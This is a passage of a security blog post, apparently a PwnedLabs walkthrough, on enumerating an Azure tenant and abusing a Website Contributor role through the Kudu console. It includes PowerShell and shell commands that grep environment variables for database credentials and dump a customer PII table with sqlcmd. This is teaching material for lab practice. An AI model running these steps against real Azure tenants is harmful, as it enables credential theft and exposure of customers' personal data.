+<li>Is this user the owner of any service principal?</li>
+</ul>
+<p>We can go ahead and query individual properties a using the Az PowerShell module which could help in mapping out possible responsibilities and relationships within the company.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-AzADUser</span> <span class="n">-UserPrincipalName</span> <span class="s1">&#39;yuki.tanaka@megabigtech.com&#39;</span> <span class="p">|</span> <span class="nb">fl
+</span></span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/BFxXMf8.png"></p>
+<p>Using the below command we could also check if there are resources owned by our current user (None Unfortunately) .</p>
+<pre tabindex="0"><code>Get-MgUserOwnedObject -UserId &#34;yuki.tanaka@megabigtech.com&#34;
+</code></pre><p><img loading="lazy" src="https://i.imgur.com/SGtIolQ.png"></p>
+<p>We could also check if our present user is a member of any groups by looping through all groups with the below script.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$userId</span> <span class="p">=</span> <span class="s2">&#34;yuki.tanaka@megabigtech.com&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$groupIds</span> <span class="p">=</span> <span class="p">(</span><span class="nb">Get-MgUserMemberOf</span> <span class="n">-UserId</span> <span class="nv">$userId</span><span class="p">).</span><span class="py">Id</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$groupNames</span> <span class="p">=</span> <span class="vm">@</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">foreach</span> <span class="p">(</span><span class="nv">$groupId</span> <span class="k">in</span> <span class="nv">$groupIds</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$group</span> <span class="p">=</span> <span class="nb">Get-MgGroup</span> <span class="n">-GroupId</span> <span class="nv">$groupId</span>
+</span></span><span class="line"><span class="cl">    <span class="nv">$groupNames</span> <span class="p">+=</span> <span class="nv">$group</span><span class="p">.</span><span class="py">DisplayName</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$groupNames</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/V9y4WuH.png"></p>
+<p>No interesting data or role where discovered in this tenant, We can switch to the Azure Subscription and enumerate which <code>RBAC</code> roles this user has.</p>
+<ul>
+<li>Retrieve the current authentication context for Azure Resource Manager requests</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span>  <span class="nb">Get-AzContext</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="n">Tenant</span><span class="err">:</span> <span class="k">Default</span> <span class="n">Directory</span> <span class="p">(</span><span class="n">2590ccef</span><span class="p">-</span><span class="mf">687d</span><span class="p">-</span><span class="n">493b-ae8d</span><span class="p">-</span><span class="n">441cbab63a72</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">SubscriptionName</span>            <span class="n">SubscriptionId</span>                       <span class="n">Account</span>                     <span class="n">Environment</span>
+</span></span><span class="line"><span class="cl"><span class="p">----------------</span>            <span class="p">--------------</span>                       <span class="p">-------</span>                     <span class="p">-----------</span>
+</span></span><span class="line"><span class="cl"><span class="n">Microsoft</span> <span class="n">Azure</span> <span class="n">Sponsorship</span> <span class="nb">ceff06cb-e29d</span><span class="p">-</span><span class="mf">4486</span><span class="n">-a3ae-eaaec5689f94</span> <span class="n">yuki</span><span class="p">.</span><span class="n">tanaka</span><span class="nv">@megabigtech</span><span class="p">.</span><span class="py">com</span> <span class="n">AzureCloud</span>
+</span></span></code></pre></div><p>The <code>Get-AzContext -ListAvailable</code> cmdlet returns all available, previously logged in contexts</p>
+<p><img loading="lazy" src="https://i.imgur.com/2SxoGDs.png"></p>
+<ul>
+<li>If a user hasn&rsquo;t executed the <code>Disconnect-AzAccount</code> command</li>
+<li>The session&rsquo;s context remains active!</li>
+<li>In which the <code>Select-AzContext</code> command could be used to impersonate the session. See <a href="https://learn.microsoft.com/en-us/powershell/module/az.accounts/select-azcontext?view=azps-12.4.0">Blog1</a>, <a href="https://stackoverflow.com/questions/56691220/set-azcontext-works-in-azure-cloud-shell-but-doesnt-in-azure-powershell">Blog2</a> and <a href="https://matthewdavis111.com/powershell/azure-az-context/">Blog3</a> to understand more.</li>
+</ul>
+<p><img loading="lazy" src="https://i.imgur.com/D8NlWYh.png"></p>
+<ul>
+<li>Enumerate subscriptions that are accessible/available to the current user</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Get-AzSubscription</span>  
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">   <span class="n">TenantId</span><span class="err">:</span> <span class="n">2590ccef</span><span class="p">-</span><span class="mf">687d</span><span class="p">-</span><span class="n">493b-ae8d</span><span class="p">-</span><span class="n">441cbab63a72</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Name</span>                        <span class="n">Id</span>                                   <span class="n">State</span>
+</span></span><span class="line"><span class="cl"><span class="p">----</span>                        <span class="p">--</span>                                   <span class="p">-----</span>
+</span></span><span class="line"><span class="cl"><span class="n">Microsoft</span> <span class="n">Azure</span> <span class="n">Sponsorship</span> <span class="nb">ceff06cb-e29d</span><span class="p">-</span><span class="mf">4486</span><span class="n">-a3ae-eaaec5689f94</span> <span class="n">Enabled</span>
+</span></span></code></pre></div><blockquote>
+<p><strong>Food For Thoughts :</strong></p>
+<p><em>So, <strong>many subscriptions can share one tenant, but each subscription is “loyal” to just one tenant</strong>.</em></p>
+</blockquote>
+<p>The below command will return the resources for which the user has <em>at least</em> the Reader role in Role-Based Access Control (<code>RBAC</code>)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">PS sec-fortress</span><span class="nv">@Pwn</span><span class="n">-F0rk</span><span class="p">-</span><span class="n">3X3C</span> <span class="p">/</span><span class="n">home</span><span class="p">/</span><span class="nb">sec-fortress</span><span class="p">/</span><span class="n">Az_lab</span><span class="p">&gt;</span> <span class="nb">Get-AzResource</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Name</span>              <span class="err">:</span> <span class="n">megabigtechdevapp23</span>
+</span></span><span class="line"><span class="cl"><span class="n">ResourceGroupName</span> <span class="err">:</span> <span class="nb">mbt-rg</span><span class="p">-</span><span class="mf">3</span>
+</span></span><span class="line"><span class="cl"><span class="n">ResourceType</span>      <span class="err">:</span> <span class="n">Microsoft</span><span class="p">.</span><span class="n">Web</span><span class="p">/</span><span class="n">sites</span>
+</span></span><span class="line"><span class="cl"><span class="n">Location</span>          <span class="err">:</span> <span class="n">eastus</span>
+</span></span><span class="line"><span class="cl"><span class="n">ResourceId</span>        <span class="err">:</span> <span class="p">/</span><span class="n">subscriptions</span><span class="p">/</span><span class="nb">ceff06cb-e29d</span><span class="p">-</span><span class="mf">4486</span><span class="n">-a3ae-eaaec5689f94</span><span class="p">/</span><span class="n">resourceGroups</span><span class="p">/</span><span class="nb">mbt-rg</span><span class="p">-</span><span class="mf">3</span><span class="p">/</span><span class="n">providers</span><span class="p">/</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">Web</span><span class="p">/</span><span class="n">sites</span><span class="p">/</span><span class="n">megabigtechdevapp23</span>
+</span></span><span class="line"><span class="cl"><span class="n">Tags</span>              <span class="err">:</span> 
+</span></span></code></pre></div><p>We can check what <code>RBAC</code> permissions we have over this Web App by running the following cmdlet</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-AzRoleAssignment</span> <span class="n">-SignInName</span> <span class="p">&lt;</span><span class="nb">User-Email</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/vsrAAzZ.png"></p>
+<p><em><strong>Break Down :</strong></em></p>
+<ul>
+<li>User has the <strong>Website Contributor</strong> role on an Azure App Service.</li>
+<li>This role includes <strong>access to the Kudu console</strong>, a tool for debugging and monitoring Azure Web Apps.</li>
+<li>The <strong>Kudu console</strong> provides terminal access to the app’s underlying operating system in a low-privilege Linux sandbox.</li>
+<li>If the web app connects to other Azure resources (e.g., Azure SQL, Storage Account, Key Vault), the user may access these in the <strong>context of the app’s permissions</strong>.</li>
+</ul>
+<p>We can go ahead an enumerate the web app further using the following cmdlet</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-AzWebApp</span> <span class="n">-Name</span> <span class="n">megabigtechdevapp23</span> <span class="p">|</span> <span class="nb">select </span><span class="n">enabledhostnames</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/bY8Q7CO.jpeg"></p>
+<p>We are more concerned about the <code>megabigtachdevapp23.scm.azurewebsites.net</code> output. Notice the <code>scm</code> between the app’s name and the default azure domain <code>azurewebsites.net</code> .</p>
+<p><code>SCM</code> stands for Source Control Manager, otherwise known as <strong>Kudu</strong>.</p>
+<p>Navigating to this domain gives us this web page as shown below :</p>
+<p><img loading="lazy" src="https://i.imgur.com/bUUlh51.png"></p>
+<p>Next, click on <code>Debug console</code> &gt; <code>PowerShell</code> .</p>
+<p><img loading="lazy" src="https://i.imgur.com/sjH1k0x.png"></p>
+<p><em><strong>Exploit Option 1 :</strong></em></p>
+<ul>
+<li>Web Apps often connect to backend resources using <strong>managed identities</strong> (a best practice).</li>
+<li>To verify this, check for <strong>environment variables</strong> like <code>IDENTITY_ENDPOINT</code> and <code>IDENTITY_HEADER</code>, which are required by managed identities.</li>
+<li>If these variables are present, you can <strong>request a token</strong> on behalf of the app to access its connected resources.</li>
+<li>For further details checkout this <a href="https://posts.specterops.io/abusing-azure-app-service-managed-identity-assignments-c3adefccff95">blog</a></li>
+</ul>
+<p><em><strong>Exploit Option 2 :</strong></em></p>
+<ul>
+<li>Web Apps can also connect to resources using <strong>connection strings</strong> stored in <strong>environment variables</strong> (via App settings).</li>
+<li>You can <strong>list all environment variables</strong> with the <code>env</code> command.</li>
+<li>To find relevant variables, use <code>grep</code> to <strong>filter by keywords</strong> (e.g., connection string names or resource names).</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">env <span class="p">|</span> grep -i -e <span class="s2">&#34;DB&#34;</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/vGjnj9R.png"></p>
+<p>As shown in the above screenshot we got a connection string for an azure SQL instance at the well-known domain <code>database.windows.net</code> which provides us with the necessary credentials to connect to the database!</p>
+<p>It is possible to enumerate useful software on this PowerShell session using the below cmdlet such as:</p>
+<ul>
+<li><strong>Microsoft SQL Server Command Line Utilities</strong></li>
+<li><strong><code>SQLCMD</code></strong></li>
+<li><strong>Microsoft SQL Server</strong> (along with any mention of &ldquo;Tools&rdquo; or &ldquo;Utilities&rdquo;)</li>
+<li><strong><code>ODBC</code> Driver for SQL Server</strong> (sometimes <code>sqlcmd</code> is installed alongside <code>ODBC</code> drivers)</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Get-ItemProperty</span> <span class="n">-Path</span> <span class="s2">&#34;HKLM:\Software\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*&#34;</span><span class="p">,</span> <span class="s2">&#34;HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*&#34;</span><span class="p">,</span> <span class="s2">&#34;HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*&#34;</span> <span class="p">|</span><span class="nb">where </span><span class="p">{</span> <span class="nv">$_</span><span class="p">.</span><span class="py">DisplayName</span> <span class="o">-ne</span> <span class="vm">$null</span> <span class="p">}</span> <span class="p">|</span> <span class="nb">Select-Object</span> <span class="n">DisplayName</span><span class="p">,</span> <span class="n">DisplayVersion</span><span class="p">,</span> <span class="n">InstallDate</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/EAQphH0.png"></p>
+<p>We can therefore query the database and check for available tables.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">sqlcmd</span> <span class="n">-S</span> <span class="n">megabigdevsqlserver</span><span class="p">.</span><span class="py">database</span><span class="p">.</span><span class="py">windows</span><span class="p">.</span><span class="py">net</span> <span class="n">-U</span> <span class="p">&lt;</span><span class="n">Username</span><span class="p">&gt;</span> <span class="n">-P</span> <span class="p">&lt;</span><span class="s1">&#39;Password&#39;</span><span class="p">&gt;</span> <span class="n">-d</span> <span class="p">&lt;</span><span class="nb">DB-NAME</span><span class="p">&gt;</span> <span class="n">-Q</span> <span class="s2">&#34;SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = &#39;BASE TABLE&#39;&#34;</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/5zkYMec.png"></p>
+<p>The <code>CustomerData</code> table was returned in output. Retrieving data from this table reveals <code>PII</code> (personally identifiable information) of Mega Big Tech customers :(</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">sqlcmd</span> <span class="n">-S</span> <span class="n">megabigdevsqlserver</span><span class="p">.</span><span class="py">database</span><span class="p">.</span><span class="py">windows</span><span class="p">.</span><span class="py">net</span> <span class="n">-U</span> <span class="p">&lt;</span><span class="n">Username</span><span class="p">&gt;</span> <span class="n">-P</span> <span class="p">&lt;</span><span class="s1">&#39;Password&#39;</span><span class="p">&gt;</span> <span class="n">-d</span> <span class="p">&lt;</span><span class="nb">DB-NAME</span><span class="p">&gt;</span> <span class="n">-Q</span> <span class="s2">&#34;SELECT * FROM CustomerData&#34;</span>
+</span></span></code></pre></div><p><img loading="lazy" src="https://i.imgur.com/5tSIOLG.png"></p>
+<p>That&rsquo;s all for today. For further reading, I recommend checking out <a href="https://pwnedlabs.io/labs/azure-recon-to-foothold-and-profit">PwnedLabs</a>, which includes defensive strategies to mitigate these issues ⛇☃︎.</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/azure/">Azure</a></li>
+      <li><a href="http://localhost:1313/tags/red-teaming/">Red Teaming</a></li>
+      <li><a href="http://localhost:1313/tags/entra-id/">Entra-ID</a></li>
+      <li><a href="http://localhost:1313/tags/powershell/">Powershell</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="http://localhost:1313/hacking/bypass_azure_web_app_authentication_with_path_traversal/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>Bypass Azure Web App Authentication with Path Traversal</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">SecFortress</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu');
+    if (menu) {
+        
+        const scrollPosition = localStorage.getItem("menu-scroll-position");
+        if (scrollPosition) {
+            menu.scrollLeft = parseInt(scrollPosition, 10);
+        }
+        
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
